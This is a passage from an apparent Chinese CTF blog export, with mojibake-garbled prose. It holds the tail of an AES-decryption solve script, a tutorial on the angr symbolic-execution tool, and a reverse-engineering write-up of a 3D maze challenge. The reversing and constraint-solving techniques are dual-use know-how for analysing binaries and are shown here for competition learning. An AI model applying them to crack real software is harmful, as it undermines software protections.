class="number">0xEA</span>, <span class="number">0xE2</span>, <span class="number">0x55</span>, <span class="number">0x50</span>, <span class="number">0x99</span>, <span class="number">0x6B</span>, <span class="number">0xC3</span>, <span class="number">0x40</span>,</span><br><span class="line"><span class="number">0x34</span>, <span class="number">0x3A</span>, <span class="number">0x04</span>, <span class="number">0x51</span>, <span class="number">0x8C</span>, <span class="number">0x38</span>, <span class="number">0xDB</span>, <span class="number">0x35</span>, <span class="number">0xD4</span>, <span class="number">0x85</span>, <span class="number">0x1A</span>, <span class="number">0x02</span>, <span class="number">0x47</span>, <span class="number">0x3F</span>, <span class="number">0x94</span>, <span class="number">0xD7</span>,</span><br><span class="line"><span class="number">0xA7</span>, <span class="number">0xE9</span>, <span class="number">0x82</span>, <span class="number">0xDE</span>, <span class="number">0x61</span>, <span class="number">0x57</span>, <span class="number">0x8D</span>, <span class="number">0x6B</span>, <span class="number">0x8B</span>, <span class="number">0xB5</span>, <span class="number">0xD8</span>, <span class="number">0x3B</span>, <span class="number">0x12</span>, <span class="number">0xDE</span>, <span class="number">0x1B</span>, <span class="number">0x7B</span>,</span><br><span class="line"><span class="number">0xFD</span>, <span class="number">0x27</span>, <span class="number">0xAB</span>, <span class="number">0x70</span>, <span class="number">0x71</span>, <span class="number">0x1F</span>, <span class="number">0x70</span>, <span class="number">0x45</span>, <span class="number">0xA5</span>, <span class="number">0x9A</span>, <span class="number">0x6A</span>, <span class="number">0x47</span>, <span class="number">0xE2</span>, <span class="number">0xA5</span>, <span class="number">0xFE</span>, <span class="number">0x90</span>,</span><br><span class="line"><span class="number">0xC7</span>, <span class="number">0x52</span>, <span class="number">0xE2</span>, <span class="number">0x46</span>, <span class="number">0xA6</span>, <span class="number">0x05</span>, <span class="number">0x6F</span>, <span class="number">0x2D</span>, <span class="number">0x2D</span>, <span class="number">0xB0</span>, <span class="number">0xB7</span>, <span class="number">0x16</span>, <span class="number">0x3F</span>, <span class="number">0x6E</span>, <span class="number">0xAC</span>, <span class="number">0x6D</span> &#125;;</span><br><span class="line"><span class="type">uint8_t</span> decryption_keys[<span class="number">224</span>];</span><br><span class="line">generateDecryptionKeys((__m128i*)rkeys, (__m128i*)decryption_keys, <span class="number">14</span>);</span><br><span class="line">aes_decrypt_array((__m128i*)ciphers, <span class="number">10</span>, (__m128i*)decryption_keys);</span><br><span class="line">ciphers[<span class="number">159</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, ciphers);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> é¢˜é›† </category>
          
          <category> CTF </category>
          
          <category> æ¯”èµ› </category>
          
      </categories>
      
      
        <tags>
            
            <tag> re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>angrå­¦ä¹ </title>
      <link href="/posts/3d36c04.html"/>
      <url>/posts/3d36c04.html</url>
      
        <content type="html"><![CDATA[<p>æ˜¨å¤©æ‰“dasctfï¼Œè¢«ç¬¬ä¸€ä¸ªé¢˜æš´æ‰“äº†ï¼Œä¹‹åå¤ç°çš„æ—¶å€™æ„Ÿè§‰å¯ä»¥çˆ†ç ´ï¼Œå°è¯•ä¸€ä¸‹angrï¼Œï¼ˆè™½ç„¶ä¸çŸ¥é“è¡Œä¸è¡Œï¼‰</p><h3 id="å®‰è£…">å®‰è£…</h3><p>å› ä¸ºæ˜¯exeæ‰€ä»¥åœ¨winä¸Šå®‰è£…</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pip install --upgrade pip</span><br><span class="line">pip install GitPython</span><br><span class="line">pip install pyvex</span><br><span class="line">pip install unicorn</span><br><span class="line">pip install simuvex</span><br><span class="line">pip install angr  </span><br><span class="line">pip install &quot;numpy&lt;1.24.0&quot;</span><br></pre></td></tr></table></figure><p>æœ€åçš„numpyä¸€å®šè¦å°äºè¿™ä¸ªç‰ˆæœ¬ï¼Œä¸ç„¶ä¼šæŠ¥é”™</p><h2 id="ä½¿ç”¨">ä½¿ç”¨</h2><p>è½½å…¥æ–‡ä»¶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p = Project(<span class="string">&#x27;xxx&#x27;</span>,auto_load_libs = <span class="literal">False</span>)</span><br><span class="line"><span class="comment"># xxxä¸ºæ–‡ä»¶è·¯å¾„</span></span><br></pre></td></tr></table></figure><p>æ‰§è¡Œåï¼Œè§†ä¸ºè½½å…¥äº†è¿™ä¸ªæ–‡ä»¶ï¼Œè¿™æ—¶æ‰å¯ä»¥åˆ†æ</p><h3 id="æ•°æ®ç±»å‹åŠæ“ä½œ">æ•°æ®ç±»å‹åŠæ“ä½œ</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bv = state.solver.BVV(<span class="number">0x1234</span>, <span class="number">32</span>)       <span class="comment"># create a 32-bit-wide bitvector with value 0x1234</span></span><br><span class="line">state.solver.<span class="built_in">eval</span>(bv)                <span class="comment"># convert to python int</span></span><br></pre></td></tr></table></figure><p>ä½å‘é‡å’Œintçš„è½¬æ¢</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">state.mem[index] <span class="comment">#æŒ‡å®šä¸€ä¸ªå†…å­˜åœ°å€</span></span><br><span class="line">state.mem[<span class="number">0x1000</span>].long = <span class="number">4</span> <span class="comment">#èµ‹å€¼ä¸ºlongç±»å‹çš„4 å¯ä»¥char, short, int, long, size_t, uint8_t, uint16_tç­‰</span></span><br><span class="line"></span><br><span class="line">state.mem[<span class="number">0x1000</span>].long.resolved <span class="comment">#è¾“å‡ºä¸ºä½å‘é‡</span></span><br><span class="line">state.mem[<span class="number">0x1000</span>].long.concrete <span class="comment">#è¾“å‡ºä¸ºint</span></span><br><span class="line"></span><br><span class="line">state.regs.rsi = state.solver.BVV(<span class="number">3</span>,<span class="number">64</span>) <span class="comment">#ç»™ä¸€ä¸ªå¯„å­˜å™¨èµ‹å€¼64ä½å€¼ä¸º3ï¼Œangrä¸­å¯„å­˜å™¨çš„å€¼å‡ä¸ºä½å‘é‡ç±»å‹</span></span><br></pre></td></tr></table></figure><p>æ“ä½œå¯„å­˜å™¨å’Œå†…å­˜åœ°å€</p><h3 id="æ±‚è§£å™¨">æ±‚è§£å™¨</h3><p>Simulation Managersç”¨æ¥ç®¡ç†çŠ¶æ€ï¼Œæ‰§è¡Œæ¨¡æ‹Ÿå’Œè¿è¡Œã€‚æ§åˆ¶ä¸€ç»„stateçš„ç¬¦å·æ‰§è¡Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">simgr = proj.factory.simulation_manager(state) <span class="comment">#åˆ›å»ºä¸€ä¸ªSM</span></span><br><span class="line">simgr.active <span class="comment">#æŸ¥çœ‹SMçŠ¶æ€</span></span><br></pre></td></tr></table></figure><p>ä¸åŠ stateé»˜è®¤ç”¨å…¥å£ç‚¹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">step() <span class="comment"># æ‰§è¡Œä¸€ä¸ªåŸºæœ¬å—</span></span><br><span class="line">run() <span class="comment">#æ‰§è¡Œåˆ°ç»“æŸ</span></span><br></pre></td></tr></table></figure><h4 id="explore">explore</h4><p>ç”¨exploreæ–¹æ³•æ¥æ¢ç´¢è·¯å¾„</p><p>æ–¹æ³•å®šä¹‰æ˜¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">explore</span>(<span class="params">self, stash=<span class="string">&#x27;active&#x27;</span>, n=<span class="literal">None</span>, find=<span class="literal">None</span>, avoid=<span class="literal">None</span>, find_stash=<span class="string">&#x27;found&#x27;</span>, avoid_stash=<span class="string">&#x27;avoid&#x27;</span>, cfg=<span class="literal">None</span>,num_find=<span class="number">1</span>, **kwargs</span>):</span><br><span class="line"><span class="comment"># find è¡¨ç¤ºç›®æ ‡åœ°ç‚¹</span></span><br><span class="line"><span class="comment"># avoid è¡¨ç¤ºä¸èƒ½åˆ°çš„åœ°ç‚¹</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">simgr.explore(find=<span class="keyword">lambda</span> s: <span class="string">b&quot;Congrats&quot;</span> <span class="keyword">in</span> s.posix.dumps(<span class="number">1</span>))</span><br><span class="line"><span class="comment"># æ±‚è§£æ‰€æœ‰å¯ä»¥è®©æ ‡å‡†è¾“å‡ºè¾“å‡ºb&quot;Congrats&quot;çš„è·¯å¾„</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s = simgr.found[<span class="number">0</span>] <span class="comment">#å–è§£</span></span><br><span class="line">flag = s.posix.dumps(<span class="number">0</span>) <span class="comment">#è¾“å‡ºå†…å®¹</span></span><br></pre></td></tr></table></figure><h3 id="æ±‚è§£å¼•æ“">æ±‚è§£å¼•æ“</h3><p>state.solver</p><p>ä½å‘é‡ï¼šæ¯”ç‰¹åºåˆ—ï¼Œå¯ä»¥æ˜¯å€¼æˆ–è€…ç¬¦å·</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">one = state.solver.BVV(<span class="number">1</span>, <span class="number">64</span>)</span><br><span class="line">one_hundred = state.solver.BVV(<span class="number">100</span>, <span class="number">64</span>)</span><br><span class="line">weird_nine = state.solver.BVV(<span class="number">9</span>, <span class="number">27</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>weird_nine.zero_extend(<span class="number">64</span> - <span class="number">27</span>)</span><br><span class="line">&lt;BV64 <span class="number">0x9</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>one + weird_nine.zero_extend(<span class="number">64</span> - <span class="number">27</span>)</span><br><span class="line">&lt;BV64 <span class="number">0xa</span>&gt;</span><br></pre></td></tr></table></figure><p>Så¸¦ç¬¦å·,ç”¨extendæ‰©å±•é•¿åº¦</p><p>åˆ›å»ºç¬¦å·å˜é‡ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x = state.solver.BVS(<span class="string">&quot;x&quot;</span>, <span class="number">64</span>)</span><br><span class="line">y = state.solver.BVS(<span class="string">&quot;y&quot;</span>, <span class="number">64</span>)</span><br></pre></td></tr></table></figure><p>å¯ä»¥ç›´æ¥è¿ç®—å¾—åˆ°ASTæŠ½è±¡è¯­æ³•æ ‘ï¼Œä½¿ç”¨SMTæ±‚è§£å™¨å¯ä»¥è½¬åŒ–AST</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">state.solver.add(x &gt; y)</span><br><span class="line">state.solver.add(y &gt; <span class="number">2</span>)</span><br><span class="line">state.solver.add(<span class="number">10</span> &gt; x)</span><br><span class="line">state.solver.<span class="built_in">eval</span>(x)</span><br></pre></td></tr></table></figure><p>addç”¨æ¥æ·»åŠ çº¦æŸï¼Œevalç”¨æ¥æ±‚è§£</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">state.satisfiable() <span class="comment">#è§£æ˜¯å¦å¯è¡Œ</span></span><br></pre></td></tr></table></figure><p>é™¤äº†æœ´ç´ çš„ eval ï¼Œangr æä¾›äº†å¤šç§è§£ææ–¹å¼ ã€‚</p><table><thead><tr><th>æ¥å£</th><th>æè¿°</th></tr></thead><tbody><tr><td><code>solver.eval(expression)</code></td><td>å°†ä¼šè§£å‡ºä¸€ä¸ªå¯è¡Œè§£</td></tr><tr><td><code>solver.eval_one(expression)</code></td><td>å°†ä¼šç»™å‡ºä¸€ä¸ªè¡¨è¾¾å¼çš„å¯è¡Œè§£ï¼Œè‹¥æœ‰å¤šä¸ªå¯è¡Œè§£ï¼Œåˆ™æŠ›å‡ºå¼‚å¸¸</td></tr><tr><td><code>solver.eval_upto(expression, n)</code></td><td>å°†ä¼šç»™å‡ºæœ€å¤šnä¸ªå¯è¡Œè§£ï¼Œå¦‚æœä¸è¶³nä¸ªå°±ç»™å‡ºæ‰€æœ‰çš„å¯è¡Œè§£ã€‚</td></tr><tr><td><code>solver.eval_exact(expression, n)</code></td><td>å°†ä¼šç»™å‡ºnä¸ªå¯è¡Œè§£ï¼Œå¦‚æœè§£çš„ä¸ªæ•°ä¸ç­‰äºnä¸ªï¼Œå°†ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚</td></tr><tr><td><code>solver.min(expression)</code></td><td>ç»™å‡ºæœ€å°å¯è¡Œè§£</td></tr><tr><td><code>solver.max(expression)</code></td><td>ç»™å‡ºæœ€å¤§å¯è¡Œè§£</td></tr></tbody></table><p>åŒæ—¶å¯ä»¥è®¾ç½® <code>extra_constraints</code> å’Œ <code>cast_to</code>å‚æ•°å¯¹ç»“æœè¿›è¡Œé™åˆ¶æˆ–è½¬æ¢ã€‚</p><hr><p><a href="https://xz.aliyun.com/t/7117?time__1311=n4%2BxnD0Dy737qY5ee05%2BbWDOQDCb8DcjxQTYID">angr ç³»åˆ—æ•™ç¨‹(ä¸€ï¼‰æ ¸å¿ƒæ¦‚å¿µåŠæ¨¡å—è§£è¯» - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯†é›† </category>
          
          <category> é€†å‘ </category>
          
          <category> å·¥å…· </category>
          
          <category> ç¬¦å·æ‰§è¡Œ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> re </tag>
            
            <tag> å·¥å…· </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf2024ç§‹-REå¤ç°</title>
      <link href="/posts/559c76ab.html"/>
      <url>/posts/559c76ab.html</url>
      
        <content type="html"><![CDATA[<h2 id="MAZE">MAZE</h2><p>è¿™ä¸ªé¢˜æ¯”èµ›çš„æ—¶å€™æ²¡æœ‰åšå‡ºæ¥</p><p>è¿™é‡Œé‡æ–°åˆ†æä¸€é</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= <span class="built_in">strlen</span>(Str) )</span><br><span class="line">      print_wrong();</span><br><span class="line">    Sleep(<span class="number">0x28</span>u);</span><br><span class="line">    <span class="keyword">switch</span> ( Str[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( v4 % <span class="number">8</span> - <span class="number">1</span> &lt; <span class="number">0</span> )</span><br><span class="line">            print_wrong();</span><br><span class="line">          <span class="keyword">if</span> ( *((_BYTE *)off_7FF692C56200 + v4 - <span class="number">1</span>) )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          --v4;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>:</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( v4 % <span class="number">8</span> + <span class="number">1</span> &gt;= <span class="number">8</span> )</span><br><span class="line">            print_wrong();</span><br><span class="line">          <span class="keyword">if</span> ( *((_BYTE *)off_7FF692C56200 + v4 + <span class="number">1</span>) )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          ++v4;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;n&#x27;</span>:</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( v4 - <span class="number">64</span> &lt; <span class="number">0</span> )</span><br><span class="line">            print_wrong();</span><br><span class="line">          <span class="keyword">if</span> ( *((_BYTE *)off_7FF692C56200 + v4 - <span class="number">64</span>) )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          v4 -= <span class="number">64</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( v4 % <span class="number">64</span> + <span class="number">8</span> &gt;= <span class="number">64</span> )</span><br><span class="line">            print_wrong();</span><br><span class="line">          <span class="keyword">if</span> ( *((_BYTE *)off_7FF692C56200 + v4 + <span class="number">8</span>) )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          v4 += <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;u&#x27;</span>:</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( v4 + <span class="number">64</span> &gt;= <span class="number">512</span> )</span><br><span class="line">            print_wrong();</span><br><span class="line">          <span class="keyword">if</span> ( *((_BYTE *)off_7FF692C56200 + v4 + <span class="number">64</span>) )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          v4 += <span class="number">64</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;w&#x27;</span>:</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( v4 % <span class="number">64</span> - <span class="number">8</span> &lt; <span class="number">0</span> )</span><br><span class="line">            print_wrong();</span><br><span class="line">          <span class="keyword">if</span> ( *((_BYTE *)off_7FF692C56200 + v4 - <span class="number">8</span>) )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          v4 -= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        print_wrong();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">436</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>ä¸»å‡½æ•°çš„switchè¯æ˜äº†è¿™æ˜¯ä¸€ä¸ªè¿·å®«é¢˜ï¼Œæœ‰6ä¸ªæ–¹å‘ï¼Œå¯ä»¥çœ‹å‡ºoffxxxæ˜¯åœ°å›¾ï¼Œæ ¹æ®æ–¹å‘å¯ä»¥å¯¹åœ°å›¾çš„åŠ å‡å¯ä»¥çœ‹å‡ºæ˜¯8*8*8çš„ç«‹ä½“åœ°å›¾</p><p>æ¯ä¸€ä¸ªcaseé‡Œé¢ï¼Œéƒ½æœ‰ä¸€ä¸ªwhileï¼Œæƒ³è¦breakå¿…é¡»off +xxxä¸ä¸º0ï¼Œæ‰“å¼€åœ°å›¾æ•°ç»„å¯ä»¥çœ‹åˆ°å…¨æ˜¯1å’Œ0ï¼Œè¯´æ˜åªæœ‰å½“è¿™ä¸ªæ–¹å‘çš„ç›¸é‚»æ ¼æ˜¯1çš„æ—¶å€™æ‰ä¼šåœæ­¢ã€‚ä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªè¿·å®«çš„ç§»åŠ¨ä¸èƒ½åœ¨ä¸­é—´åœæ­¢</p><p>æœ€åï¼Œæˆ‘ä»¬å¾—åˆ°è¿·å®«é‡ç‚¹åœ¨436çš„ä½ç½®ï¼ˆi,j,kï¼‰=(6,6,4)</p><p>ç”»å‡ºåœ°å›¾</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">map = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, </span><br><span class="line"><span class="built_in">       1,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       </span></span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       </span></span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span 